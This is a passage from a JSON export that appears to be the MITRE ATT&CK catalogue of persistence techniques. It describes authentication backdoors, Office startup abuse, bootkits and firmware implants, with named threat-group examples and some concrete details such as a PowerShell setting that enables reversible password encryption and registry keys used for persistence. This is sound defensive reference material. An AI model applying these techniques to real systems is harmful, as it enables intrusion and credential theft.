of the malicious payload. Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.", "id": "T1574.013", "examples": [{"id": "S0182", "name": "FinFisher", "description": "FinFisher has used the KernelCallbackTable to hijack the execution flow of a process by replacing the __fnDWORD function with the address of a created Asynchronous Procedure Call stub routine."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode."}]}, {"name": "AppDomainManager", "description": "Adversaries may execute their own malicious payloads by hijacking how the .NET AppDomainManager loads assemblies. The .NET framework uses the AppDomainManager class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exe or .dll binaries compiled to run as .NET code) may be loaded into an application domain as executable code.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking how the .NET AppDomainManager loads assemblies. The .NET framework uses the AppDomainManager class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exe or .dll binaries compiled to run as .NET code) may be loaded into an application domain as executable code.\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (.config) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.", "id": "T1574.014", "examples": [{"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader is executed via the AppDomainManager injection technique."}]}]}, {"name": "Implant Internal Image", "description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim\u2019s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.", "detailed_description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim\u2019s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.\nA tool has been developed to facilitate planting backdoors in cloud container images. If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a Web Shell.", "id": "T1525", "examples": [], "sub_techniques": []}, {"name": "Modify Authentication Process", "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.", "detailed_description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.", "id": "T1556", "examples": [{"id": "S0377", "name": "Ebury", "description": "Ebury can intercept private keys using a trojanized ssh-add function."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has trojanized the ssh_login and user-auth_pubkey functions to steal plaintext credentials."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook."}], "sub_techniques": [{"name": "Domain Controller Authentication", "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.", "detailed_description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.", "id": "T1556.001", "examples": [{"id": "G0114", "name": "Chimera", "description": "Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential."}, {"id": "S0007", "name": "Skeleton Key", "description": "Skeleton Key is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller."}]}, {"name": "Password Filter DLL", "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.", "detailed_description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.", "id": "T1556.002", "examples": [{"id": "S0125", "name": "Remsec", "description": "Remsec harvests plain-text credentials as a password filter registered on domain controllers."}, {"id": "G0041", "name": "Strider", "description": "Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password."}]}, {"name": "Pluggable Authentication Modules", "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.", "detailed_description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.", "id": "T1556.003", "examples": [{"id": "S0377", "name": "Ebury", "description": "Ebury can deactivate PAM modules to tamper with the sshd configuration."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users."}]}, {"name": "Network Device Authentication", "description": "Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.", "detailed_description": "Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.", "id": "T1556.004", "examples": [{"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password."}, {"id": "S0519", "name": "SYNful Knock", "description": "SYNful Knock has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device."}]}, {"name": "Reversible Encryption", "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.", "detailed_description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher. In PowerShell, an adversary may make associated changes to user settings using commands similar to Set-ADUser -AllowReversiblePasswordEncryption $true.", "id": "T1556.005", "examples": []}, {"name": "Multi-Factor Authentication", "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.", "detailed_description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.\nFor example, modifying the Windows hosts file (C:\\windows\\system32\\drivers\\etc\\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.", "id": "T1556.006", "examples": [{"id": "S0677", "name": "AADInternals", "description": "The AADInternals Set-AADIntUserMFA command can be used to disable MFA for a specified user."}, {"id": "G1015", "name": "Scattered Spider", "description": "After compromising user accounts, Scattered Spider registers their own MFA tokens."}, {"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided."}]}, {"name": "Hybrid Identity", "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.", "detailed_description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID:\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges.\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the AzureADConnectAuthenticationAgentService process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials. In environments using AD FS, an adversary may edit the Microsoft.IdentityServer.Servicehost configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.", "id": "T1556.007", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can inject a malicious DLL (PTASpy) into the AzureADConnectAuthenticationAgentService to backdoor Azure AD Pass-Through Authentication."}, {"id": "G0016", "name": "APT29", "description": "APT29 has edited the Microsoft.IdentityServer.Servicehost.exe.config file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name."}]}, {"name": "Network Provider DLL", "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local mpnotify.exe process via RPC. The mpnotify.exe process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.", "detailed_description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local mpnotify.exe process via RPC. The mpnotify.exe process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.\nAdversaries can configure a malicious network provider DLL to receive credentials from mpnotify.exe. Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the NPLogonNotify() function.\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.", "id": "T1556.008", "examples": []}, {"name": "Conditional Access Policies", "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.", "detailed_description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication. In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain condition attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested. These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required.\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication requirements, or allowing additional Unused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.", "id": "T1556.009", "examples": [{"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has added additional trusted locations to Azure AD conditional access policies. "}]}]}, {"name": "Office Application Startup", "description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.", "detailed_description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page. These persistence mechanisms can work within Outlook or be used through Office 365.", "id": "T1137", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option, once the Application.Startup event is received."}], "sub_techniques": [{"name": "Office Template Macros", "description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. ", "detailed_description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. \nOffice Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations.\nWord Normal.dotm location:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\nExcel Personal.xlsb location:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.", "id": "T1137.001", "examples": [{"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike has the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used a Word Template, Normal.dotm, for persistence."}]}, {"name": "Office Test", "description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.", "detailed_description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.\nThere exist user and global Registry keys for the Office Test feature, such as:\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.", "id": "T1137.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\\Software\\Microsoft\\Office test\\Special\\Perf to execute code."}]}, {"name": "Outlook Forms", "description": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.", "detailed_description": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.\nOnce malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.", "id": "T1137.003", "examples": [{"id": "S0358", "name": "Ruler", "description": "Ruler can be used to automate the abuse of Outlook Forms to establish persistence."}]}, {"name": "Outlook Home Page", "description": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.", "detailed_description": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.\nOnce malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.", "id": "T1137.004", "examples": [{"id": "G0049", "name": "OilRig", "description": "OilRig has abused the Outlook Home Page feature for persistence. OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse."}, {"id": "S0358", "name": "Ruler", "description": "Ruler can be used to automate the abuse of Outlook Home Pages to establish persistence."}]}, {"name": "Outlook Rules", "description": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.", "detailed_description": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.\nOnce malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.", "id": "T1137.005", "examples": [{"id": "S0358", "name": "Ruler", "description": "Ruler can be used to automate the abuse of Outlook Rules to establish persistence."}]}, {"name": "Add-ins", "description": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. ", "detailed_description": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. \nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.", "id": "T1137.006", "examples": [{"id": "S0268", "name": "Bisonal", "description": "Bisonal has been loaded through a .wll extension added to the %APPDATA%\\microsoft\\word\\startup\\ repository."}, {"id": "S1143", "name": "LunarLoader", "description": "LunarLoader has the ability to use Microsoft Outlook add-ins to establish persistence. "}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail has the ability to use Outlook add-ins for persistence."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host."}]}]}, {"name": "Power Settings", "description": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.", "detailed_description": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.\nAdversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.\nFor example, powercfg controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down. Adversaries may also extend system lock screen timeout settings. Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.\nAware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.", "id": "T1653", "examples": [], "sub_techniques": []}, {"name": "Pre-OS Boot", "description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.", "detailed_description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.", "id": "T1542", "examples": [], "sub_techniques": [{"name": "System Firmware", "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.", "detailed_description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.", "id": "T1542.001", "examples": [{"id": "S0047", "name": "Hacking Team UEFI Rootkit", "description": "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems."}, {"id": "S0397", "name": "LoJax", "description": "LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems."}, {"id": "S0001", "name": "Trojan.Mebromi", "description": "Trojan.Mebromi performs BIOS modification and can download and execute a file as well as protect itself from removal."}]}, {"name": "Component Firmware", "description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.", "detailed_description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.", "id": "T1542.002", "examples": [{"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has maintained persistence by patching legitimate device firmware when it is downloaded, including that of WatchGuard devices."}, {"id": "G0020", "name": "Equation", "description": "Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers."}]}, {"name": "Bootkit", "description": "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.", "detailed_description": "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.", "id": "T1542.003", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy."}, {"id": "G0096", "name": "APT41", "description": "APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems."}, {"id": "S0114", "name": "BOOTRASH", "description": "BOOTRASH is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has installed a bootkit on the system to maintain persistence."}, {"id": "S0182", "name": "FinFisher", "description": "Some FinFisher variants incorporate an MBR rootkit."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down."}, {"id": "S0112", "name": "ROCKBOOT", "description": "ROCKBOOT is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can implant malicious code into a compromised device's firmware."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate overwrites the MBR with a bootloader component that performs destructive wiping operations on hard drives and displays a fake ransom note when the host boots."}]}, {"name": "ROMMONkit", "description": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. ", "detailed_description": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. \nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.", "id": "T1542.004", "examples": []}, {"name": "TFTP Boot", "description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.", "detailed_description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to ROMMONkit and may result in the network device running a modified image.", "id": "T1542.005", "examples": []}]}, {"name": "Scheduled Task/Job", "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. 